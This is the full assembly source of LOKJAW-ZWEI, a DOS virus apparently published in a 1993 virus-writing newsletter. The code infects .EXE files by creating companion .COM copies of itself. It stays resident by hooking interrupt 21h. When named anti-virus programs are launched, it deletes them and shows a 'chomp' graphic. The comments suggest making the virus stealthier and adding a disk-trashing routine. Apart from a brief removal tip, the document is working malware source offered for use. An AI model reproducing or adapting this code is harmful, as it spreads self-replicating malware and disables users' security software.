;LOKJAW-ZWEI: an .EXE-infecting spawning virus with retaliatory 
;anti-anti-virus capability.  For Crypt Newsletter 12, Feb. 1993.               
;
;LOKJAW-ZWEI is a resident spawning virus which installs itself in
;memory using the same engine as the original Civil War/Proto-T virus.
;It is simpler in that none of its addresses have to be 
;relative, an indirect benefit of the fact that the virus has no 
;"appending" quality.  That means, LOKJAW doesn't alter its "host" files,
;much like a number of other companion/spawning viruses published in
;previous newsletters.
;
;LOKJAW hooks interrupt 21 and infects .EXE files on execution, creating 
;itself as companion .COMfile to the "host."  Due to the inherent rules
;of DOS, this ensures the virus will be executed before the "host" the
;next time the infected program is used.  In reality, LOKJAW is even
;simpler than that.  If not in memory, the first time the host is
;called, LOKJAW will go resident and not even bother to load it.
;In most cases, the user will assume a slight error and call the host
;again, at which point it will function normally. LOKJAW will then infect
;every subsequent .EXE file called. LOKJAW is very transparent in operation,
;except when certain anti-virus programs (Integrity Master, McAfee's SCAN &
;CLEAN, F-PROT & VIRSTOP and Central Point Anti-virus) are loaded.
;LOKJAW spawning variants are so simple they don't even need much in the
;way of installation checks. The virus simply becomes resident the first
;time it is called. Once in memory, when other infect file are executed
;LOKJAW merely looks over the loaded file, if it recognizes itself it
;discards the load and proceeds to execute the "infected" file as would
;be the case on an uninfected system.
;
;LOKJAW's "stinger" code demonstrates the simplicity of creating a strongly
;retaliating virus by quickly deleting the anti-virus program before it
;can execute and then displaying a "chomping" graphic.  Even if the anti-
;virus program cannot detect LOKJAW in memory, it will be deleted.  This
;makes it essential that the user know how to either remove the virus from
;memory before beginning anti-virus measures, or at the least run the
;anti-virus component from a write-protected disk. (If the LOKJAW viruses
;are present in memory and an anti-virus program is run from a write- 
;protected disketter, it will, of course, generate "write protect" 
;errors.) At a time when retail anti-virus packages are becoming more 
;complicated - and more likely that the
;average user will run them from default installations on his hard file -
;LOKJAW's retaliating power makes it a potentially very annoying pest.
;A virus-programmer serious about inconveniencing a system could do a
;number of things with this basic idea. They are;
; 1. Remove the "chomp" effect. It is entertaining, but it exposes the virus
; instantly.
; 2. Alter the_stinger routine, so that the virus immediately attacks the
; hard file.  The implementation is demonstrated by LOKJAW-DREI, which
; merely makes the disk inaccessible until a warm reboot if an anti-virus
; program is employed against it.  By placing
; a BONA FIDE disk-trashing routine here, it becomes very hazardous for
; an unknowing user to employ anti-virus measures on a machine where
; LOKJAW or a LOKJAW-like program is memory resident. LOKJAW-DREI,
; which does not try to delete anti-virus files, displays the "chomp"
; and mimics trashing the disk even when the anti-virus program is
; used from a write-protected diskette.  Of course, the user will 
; see no "write protect" error as with the other viruses. The disk merely
; becomes inacessible.
;
;These anti-anti-virus strategies are becoming more common in viral 
;programming.                 
;
;Mark Ludwig programmed the features of a direct-action retaliating
;virus in his "Computer Virus Developments Quarterly."  Peach, Groove and
;Encroacher viruses attack anti-virus software by deletion of files central
;to the functionality of the software. 
;
;And in this issue, the Sandra virus employs a number 
;of anti-anti-virus features. 
;
;The LOKJAW source listings are TASM compatible. To remove LOKJAW-ZWEI and                
;DREI infected files from a system, simply delete the "companion" .COM 
;duplicates of your executables.  Ensure that the machine has been booted
;from a clean disk.  To remove the LOKJAW .COM-appending virus, at this
;time it will be necessary for you to restore the contaminated files from
;a clean back-up.
;
;Alert readers will notice the LOKJAW-ZWEI and DREI create their "companion"
;files in plain sight.  Generally, spawning viruses make themselves
;hidden-read-only-system files.  This is an easy hack and the code is supplied
;in earlier issues of the newsletter.  The modification is left to 
;the reader as an academic exercise.

	       .radix 16
     cseg       segment
		model  small
		assume cs:cseg, ds:cseg, es:cseg

		org 100h

oi21            equ endit
filelength      equ endit - begin
nameptr         equ endit+4
DTA             equ endit+8

	 




begin:          jmp     virus_install                              

note:            
		db     '[lôákıÑW-zWêç].·ù.ör„$≈ÜdâMñ$'
		db     '≈Hã$.p‚ôG‚Üm.å$.Ö.{p‚ô≈î-≈].˚É‚ãÜ§≈,$ì‚≈.îü.'
		db     'Ä‚òû.•âw$¿‰◊Ó‚'     ; I.D. note: will probably be
					    ; documented in VSUM
		

						 ; install
virus_install:  mov     ax,cs                    ; reduce memory size     
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a    ; check if last memory     
		jne     cancel                   ; block     
		mov     ax,ds:[0003]                 
		sub     ax,100                   ; decrease memory     
		mov     ds:0003,ax
Zopy_virus:  
		mov     bx,ax                    ; copy to claimed block  
		mov     ax,es                    ; PSP    
		add     ax,bx                    ; virus start in memory   
		mov     es,ax
		mov     cx,offset endit - begin  ; cx = length of virus                  
		mov     ax,ds                    ; restore ds   
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin]            ; point to start of virus
		lea     di,es:0100               ; point to destination   
		rep     movsb                    ; copy virus in memory   
						     


Grab_21:                                     
		
		mov     ds,cx                   ; hook interrupt 21h
		mov     si,0084h                ; 
		mov     di,offset oi21
		mov     dx,offset check_exec
		lodsw
		cmp     ax,dx                   ;
		je      cancel                  ; exit, if already installed
		stosw
		movsw
		
		push    es 
		pop     ds
		mov     ax,2521h                ; revector int 21h to virus
		int     21h
				     
cancel:         ret          

check_exec:                                    ; look over loaded files
		pushf                          ; for executables

		push    es                     ; push everything onto the
		push    ds                     ; stack
		push    ax
		push    bx
		push    dx

		cmp     ax,04B00h               ; is a file being 
						; executed ?
		
		
		jne     abort                   ; no, exit
		
		


					     ;if yes, try the_stinger
do_infect:      call    infect                  ; then try to infect
		
		
			      

abort:                                        ; restore everything
		pop     dx
		pop     bx
		pop     ax
		pop     ds
		pop     es
		popf

bye_bye:      
					     ; exit
		jmp     dword ptr cs:[oi21]                     


new_24h:        
		mov     al,3             ; critical error handler
		iret

infect:          
		mov     cs:[name_seg],ds       ; this routine
		mov     cs:[name_off],dx       ; essentially grabs
					       ; the name of the file
		cld                            ; <--
		mov     di,dx                  ; being loaded 
		push    ds                     ; and copies it into a
		pop     es                     ; buffer where the virus
		mov     al,'.'                 ; can compare it to its 
		repne   scasb                  ; "anti-virus" list, from 
					       ; the_stinger routine
		call    the_stinger    ; now, call Lokjaw's anti-virus
				       ; stinger
		
				       ; no anti-virus, resume infection
		
		cld                                ; clear direction flags
		mov     word ptr cs:[nameptr],dx ; save pointer to the filename
		mov     word ptr cs:[nameptr+2],ds

		mov     ah,2Fh                    ; get old DTA
		int     21h
		push    es
		push    bx

		push    cs                        ; set new DTA

		pop     ds
		mov     dx,offset DTA
		mov     ah,1Ah
		int     21h

		call    searchpoint              ; find filename for virus
		push    di
		mov     si,offset COM_txt       ; is extension 'COM' ?

		mov     cx,3
	 rep    cmpsb 
		pop     di
		jz      do_com                  ; if so, go to out .COM routine
		mov     si,offset EXE_txt       ; is extension .EXE ?
		nop
		mov     cl,3
		rep     cmpsb
		jnz     return

do_exe:         mov     si,offset COM_txt      ; load .COM extent mask
		nop
		call    change_ext             ; change extension on filename.EXE
		mov     ax,3300h               ; to .COM
		nop
		int     21h
		push    dx

		cwd
		inc     ax                     ; clear flags
		push    ax
		int     21h

Grab24h:        
		
		mov     ax,3524h           ; get critical error handler vector
		int     21h        
		push    bx
		push    es
		push    cs                 ; set interrupt 24h to new handler
		pop     ds
		mov     dx,offset new_24h
		mov     ah,25h
		push    ax
		int     21h
		
		
		lds     dx,dword ptr [nameptr]  ; create the virus (with name)
		xor     cx,cx                   ; of EXE target
		mov     ah,05Bh                 ;
		int     21
		jc      return1                 
		xchg    bx,ax                   ; save handle
		


		push    cs
		pop     ds
		mov     cx,filelength          ; cx = virus length
		mov     dx,offset begin
		mov     ah,40h                ; write the virus to the created
		int     21h                    ; file

		mov     ah,3Eh                 ; close the file
		int     21h

return1:        pop     ax                     ; restore interrupt 24h
		pop     ds
		pop     dx
		int     21h
		
		pop     ax
		pop     dx                     ; restore Crtl-break flags
		int     21h
		
		mov     si,offset EXE_txt      ; load .EXE mask
		call    change_ext             ; and change the extension on
					       ; the filename back to original
return:         mov     ah,1Ah                 ; host
		pop     dx                     ; restore old DTA
		pop     ds
		int     21H

		ret                            ;

do_com:         call    findfirst           ; is the .COMfile executed the virus?    
		cmp     word ptr cs:[DTA+1Ah],endit - begin
		jne     return              ; no, so exit
		mov     si,offset EXE_txt   ; does the .EXE variant exist ?
		call    change_ext          
		call    findfirst
		jnc     return              ; 
		mov     si,offset COM_txt   ; load .COM extension
		call    change_ext          ; change the filename and
		jmp     short return        ; jump to exit

searchpoint:    les     di,dword ptr cs:[nameptr]
		mov     ch,0FFh
		mov     al,0
	 repnz  scasb
		sub     di,4
		ret
change_ext:     call    searchpoint
		push    cs
		pop     ds
		movsw
		movsw
		ret

findfirst:      lds     dx,dword ptr [nameptr]
		mov     cl,27h
		mov     ah,4Eh
		int     21h
		ret
			 
the_stinger:   ; the_stinger compares the loaded filename with these defaults
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      jumptoass                  ; Stiller Research
		
		cmp     word ptr es:[di-3],'XR'    ; Virx = VIREX
		je      jumptoass                  ; if there's a match
						   ; go to assassinate file
		cmp     word ptr es:[di-3],'PO'    ;*STOP = VIRSTOP
		jne     next1                      ; F-Prot
		cmp     word ptr es:[di-5],'TS'   
		je      jumptoass                

next1:          cmp     word ptr es:[di-3],'VA'    ; AV = CPAV
		je      jumptoass                  ; Central Point   
		
		cmp     word ptr es:[di-3],'TO'    ;*prot = F-prot
		jne     next2                
		cmp     word ptr es:[di-5],'RP'  
		je      jumptoass                     

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan  = McAfee's Scan.
		jne     next3                
		cmp     word ptr es:[di-5],'CS'  
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'NA'    ; *lean = CLEAN.
		jne     next3                      ; why not, eh?
		cmp     word ptr es:[di-5],'EL'  
		je      jumptoass                     
next3:          ret                
jumptoass:                             ; assassinate anti-virus program

		mov     ds,cs:[name_seg]           ; points to
		mov     dx,cs:[name_off]           ; filename to delete
		
		mov     ax, 4301h                  ; clear attributes
		mov     cx, 00h
		int     21h            
		jc      chomp                      ; exit on error to visual
		mov     ah, 41h                    ; delete anti-virus file
		int     21h                        ; exit on error to visual
		jc      chomp
chomp:
		push    cs                           ; chomper visual
		pop     ds
		mov     ah, 03h
		int     10h
		mov     [c1], bh                   ; save cursor 
		mov     [c2], dh 
		mov     [c3], dl 
		mov     [c4], ch 
		mov     [c5], cl 
		mov     ah, 1
		mov     cl, 0
		mov     ch, 40h                 
		int     10h                    
					       
		mov     cl, 0
		mov     dl, 4Fh                 
		mov     ah, 6
		mov     al, 0
		mov     bh, 0Fh
		mov     ch, 0
		mov     cl, 0
		mov     dh, 0
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 0
		mov     dl, 1Fh
		mov     bh, 0
		int     10h                    
					       
		mov     dx,offset eyes           ; print the eyes
		mov     ah, 9
		mov     bl, 0Fh
		int     21h                    
					       
		mov     ah, 2
		mov     dh, 1
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DCh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 18h
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DFh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     dl, 0
chomp_1:
		mov     ah, 2
		mov     dh, 2
		int     10h                    
					       
		mov     ah, 9
		mov     al, 55h                 
		mov     bl, 0Fh
		mov     cx, 1
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 17h
		inc     dl
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0EFh
		mov     bl, 0Fh
		int     10h                    
					       
		inc     dl
		cmp     dl, 50h                 
		jl      chomp_1                  
		mov     [data_1], 0
chomp_3:
		mov     cx, 7FFFh                    ; delays

locloop_4:
		loop    locloop_4              

		inc     [data_1]
		cmp     [data_1], 0Ah
		jl      chomp_3                  
		mov     [data_1], 0
		mov     cl, 0
		mov     dl, 4Fh                 
chomp_5:
		mov     ah, 6
		mov     al, 1
		mov     bh, [data_2]
		mov     ch, 0Dh
		mov     dh, 18h
		int     10h                    
					       
		mov     ah, 7
		mov     al, 1
		mov     bh, [data_2]
		mov     ch, 0
		mov     dh, 0Ch
		int     10h                    
		mov     cx, 3FFFh                      ; delays

locloop_6:
		loop    locloop_6              
		inc     [data_1]
		cmp     [data_1], 0Bh
		jl      chomp_5                  
		mov     [data_1], 0
chomp_7:
		mov     cx, 7FFFh                       ; delays

locloop_8:
		loop    locloop_8              
		inc     [data_1]
		cmp     [data_1], 0Ah
		jl      chomp_7                  
		mov     ah, 6
		mov     al, 0
		mov     bh, [data_2]
		mov     ch, 0
		mov     cl, 0
		mov     dh, 18h
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     cl, 7
		mov     ch, 6
		int     10h                    
		
		mov     ah, 2
		mov     bh, [c1] 
		mov     dh, [c2] 
		mov     dl, [c3] 
		int     10h
		mov     al, bh
		mov     ah, 5
		int     10h
		mov     ah, 1
		mov     ch, [c4]
		mov     cl, [c5]
		int     10h
		mov     ax, 0003h
		int     10h                        ; sort of a cls
		mov     ax, 00ffh
		ret





		

EXE_txt         db  'EXE',0      ; extension masks
COM_txt         db  'COM',0

eyes            db      '(o)          (o)','$'  ; ASCII eyes of Lockjaw    

data_1          db      0
data_2          db      0

name_seg        dw  ?
name_off        dw  ?

c1              db       0          
c2              db       0          
c3              db       0          
c4              db       0          
c5              db       0          

note2:           db     'Lokjaw-Zwei'
			   
endit:


cseg            ends
		end begin



